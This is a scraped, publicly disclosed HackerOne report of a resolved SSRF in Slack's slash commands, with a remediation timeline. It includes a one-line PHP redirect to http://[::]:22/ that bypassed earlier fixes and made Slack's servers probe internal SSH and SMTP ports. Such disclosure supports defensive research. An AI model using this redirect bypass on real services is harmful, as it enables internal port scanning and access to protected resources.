---
title: "SSRF in api.slack.com, using slash commands and bypassing the protections."
author: elber (HackerOne handle)
url: https://hackerone.com/reports/381129
date_published: 2018-07-13 (reported); disclosed 2019-02-22
date_scraped: 2026-11-16
platform: hackerone
disclosed_report: https://hackerone.com/reports/381129
bounty: "awarded (amount hidden on page)"
vuln_class: ssrf
---

<!-- Raw scraped text below. Public, non-paywalled content only.
     This file is source material, never copied into skills verbatim. -->

Reported to: Slack. Severity: Medium (4 ~ 6.9). Weakness: Server-Side Request Forgery (SSRF). Status: Resolved. Related earlier reports: #61312 and #356765 (this report bypasses their fixes).

## Report body (submitted July 13, 2018, 3:38am UTC by elber)

Bypassing the reports #61312 and #356765

**Tutorial:**

**Go to api.slack.com and create an application with your own slash command.**

[screenshot: slack.png, slash command configuration]

**Enter your own domain:** in your own domain: index.php

```php
<?php header("location: http://[::]:22/"); ?>
```

location: http://[::]:22/

[screenshot: index.png]

And save.

Go to your Slack and type /youslash

Try with my server http://206.189.204.187/

Results:

SSH

[screenshot: request.png]

SMNTP

[screenshot: smntp_ssh.png]

## Impact

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources, and scan for internal ports and get the versions of the services running on the server.

Referer: https://www.owasp.org/index.php/Server_Side_Request_Forgery https://hackerone.com/reports/61312

## Timeline / comments

- 2018-07-13 18:53 UTC, bugtriage-josh: Thank you for your report. We're looking into this and will keep you updated.
- 2018-07-14, elber: Ok tnks :)
- 2018-07-18, elber: Any update?
- 2018-07-18 15:21 UTC, maxfeldman changed status to Triaged: "triaged!"
- 2018-10-01, elber: Hello slack, has been some time since the last comment, some advance?
- 2018-10-18, maxfeldman: the team is still working on this, thanks for your patience!
- 2018-12-11, elber: I tested this, it looks like the problem has been solved :) [screenshot attached]
- 2019-01-10, elber: Can we close this report now?
- 2019-01-11, maxfeldman: sorry for the delay, pushing through post-holiday backlog, will close and reward shortly.
- 2019-01-23 20:52 UTC, maxfeldman closed the report, status Resolved. "Sorry for the delay!"
- 2019-01-23 20:53 UTC, Slack rewarded elber with a bounty (amount hidden). "Thank you!"
- 2019-01-23, elber requested to disclose.
- 2019-02-22 20:58 UTC, report disclosed.
